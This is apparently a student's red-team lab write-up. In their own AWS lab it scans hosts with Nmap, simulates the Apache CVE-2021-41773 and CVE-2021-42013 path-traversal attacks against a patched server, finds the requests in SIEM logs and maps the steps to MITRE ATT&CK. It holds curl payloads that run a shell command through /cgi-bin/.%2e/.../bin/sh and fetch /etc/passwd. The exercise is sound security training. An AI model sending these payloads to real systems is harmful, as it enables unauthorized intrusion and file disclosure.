

<br><br>

# Red Notes:


<br><br><br>


# Red Team Exploitation & CVE Attack Simulation

From the Kali EC2, simulate an attacker:

- Enumerate the Ubuntu Logger and/or SIEM

- Identify exposed services

- Select real-world CVEs based on those services

- Execute or simulate exploits

- Map TTPs using the MITRE ATT&CK framework

---



1. Used ping to ensure I'm able to communicate outbound and inbound traffic to conferm the lab setup was completed correctly.

        ubuntu-logger
        172.31.24.26

        siem-server
        172.31.27.218

![alt text](image.png)


<br>

2.  Running network enumeration on bother servers, ubuntu-logger and siem-server.

        nmap -sS -sV -T4 -Pn 172.31.24.26 -oN nmap_scan_ubuntu.txt
        
        nmap -sS -sV -T4 -Pn 172.31.27.218 -oN nmap_scan_siem.txt

    ![alt text](image-1.png)

    - Analyzing the results, i'm able to confirm the ubuntu-logger has no open services and is locked down.  For the sake of the project, I artificicially installed potential targets, like Apache.  

            sudo apt update
            sudo apt install apache2 -y
            sudo systemctl enable apache2
            sudo systemctl start apache2
            curl http://localhost       # Should provide the Apache welcome output

        - Updated the AWS security group, ensuring port 80 source IP was updated to 172.31.0.0/16
            
            ![alt text](image-3.png)




    - Nmap rescan of the ubuntu-logger

        We can see the Apache server on port 80 is open

        ![alt text](image-2.png)


<br>

3. Analyze Nmap Results and Select CVEs

    - ubuntu-logger shows the only open port, `80/tcp   open   http    Apache httpd 2.4.58 ((Ubuntu))`

    - siem-server shows all ports closed or filtered.

    - Searching any CVEs using Exploit Db and filtered for `apache 2.4.` to find the move CVEs available

        ![alt text](image-4.png)

    - Even though there weren't any vulnerabilities directly applied to the current running Apache, it was a coin flip and choosing a verified CVE vulnerability:
    
        - Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)

            https://www.exploit-db.com/exploits/50406
            
                CVE-2021-42013

            ![alt text](image-5.png)


        - Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)

            https://www.exploit-db.com/exploits/50383

                CVE-2021-41773

            ![alt text](image-6.png)


<br>

4. Simulated Apache Attacks: 

    - CVE-2021-42013 (Apache 2.4.50)

        - In the Kali EC2 run the following to test RCE using path traversal with script execution

            curl -v --path-as-is -d 'echo Content-Type: text/plain; echo; id' http://172.31.24.26/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh

        - Output:  The path traversal and remote code execution was rejected indicating to me Apache 2.4.58 patched the traversal vulnerability

            ![alt text](image-7.png)



    - CVE-2021-41773 (Apache 2.4.49)

        - Using the following command, I attempted to retrieve /etc/passwd using double-encoded traversal

                curl -v --path-as-is http://172.31.24.26/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

        - Output:  There server rejected the malformed request indicating to me Apache 2.4.58 patched the traversal vulnerability

            ![alt text](image-8.png) 


    - Outcomes from both simulated attacks

        Since there wasn't any verified Apache 2.4.58 vulnerable CVEs I was forced to used a prior CVEs that have been since patched as Apached updated its application.  This is why there I was unable to successfully gain access.  


<br>

5.  Verifying logs in the SIEM of the attacks

    - Queried for logs using `message:("/cgi-bin" OR "%2e" OR "bin/sh") AND program:("apache2" OR "apache_access")`

        - Command used:   
                curl -v --path-as-is -d 'echo Content-Type: text/plain; echo; id' http://172.31.24.26/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh

            - Log identified was a post 
            
                POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`

        - Command used:

                curl -v --path-as-is http://172.31.24.26/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

        - Log identified was GET
        
                "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

    -  Some tell tale signed were identifying the HTTP codes 400 for each log.  And the attack related patterns that led me to identify the logs for the Apache hack.  



6. Mitre Technique Table

    Most of how I gathering these technique IDs were me search/finding the kind of logic I useed in the approached how I performed my attack

    |Step        | Action           | Tactic (Goal)            | Technique Name            | Technique ID  |
    |----------- |----------------------|---------------------|---------------------|---------------------|
    |1   | Scanned ports with Nmap     | Reconnaissance	     | Network Service Scanning     | T1046    |
    |2   | Detected Apache version with nmap -sV     | Reconnaissance	     | Active Scanning     | 	T1595.002     |
    |3   | Researched vulnerabilities     | Resource Development     | Vulnerability Identification    | T1592     |
    |4   | Simulated CVE via HTTP request to Apache     | Initial Access     | Exploit Public-Facing Application    | T1190     |
    |5   | Sent payloads using curl to /cgi-bin/     | Execution     | Command and Scripting Interpreter     | T1059     |
    |6   | Logs captured in Apache and SIEM     | Collection / Detection     | Data from Information Repositories     | T1213 or T1005     |
    |7   | Observed anomalies in SIEM     | Discovery     | File and Directory Discovery (log review)     | T1083     |


# Red Team Summary

In the Red Team phase of this project, a Kali Linux EC2 instance was deployed in AWS to simulate offensive security testing against a second EC2 instance hosting Apache HTTP Server 2.4.58. The attack campaign began with reconnaissance using Nmap to enumerate open ports and service versions on the target (Ubuntu Logger). Although most services were filtered, Apache on port 80 was successfully detected.

Two publicly known vulnerabilities were selected for simulation: CVE-2021-41773 and CVE-2021-42013, both involving path traversal and remote code execution vulnerabilities in Apache versions 2.4.49 and 2.4.50, respectively. These CVEs were chosen due to their high CVSS scores, public exploit availability, and relevance to the detected service. The attacks were simulated using curl with double-encoded traversal payloads targeting the /cgi-bin path. Although the target system was patched and not exploitable, the crafted requests were logged as expected.

Each Red Team activity was mapped to corresponding MITRE ATT&CK techniques, including T1046 (Network Service Scanning), T1190 (Exploit Public-Facing Application), and T1059 (Command and Scripting Interpreter). These mappings help illustrate how the attack chain would align with real-world adversary behaviors. The simulated actions generated log artifacts that were later ingested and analyzed in the Blue Team phase.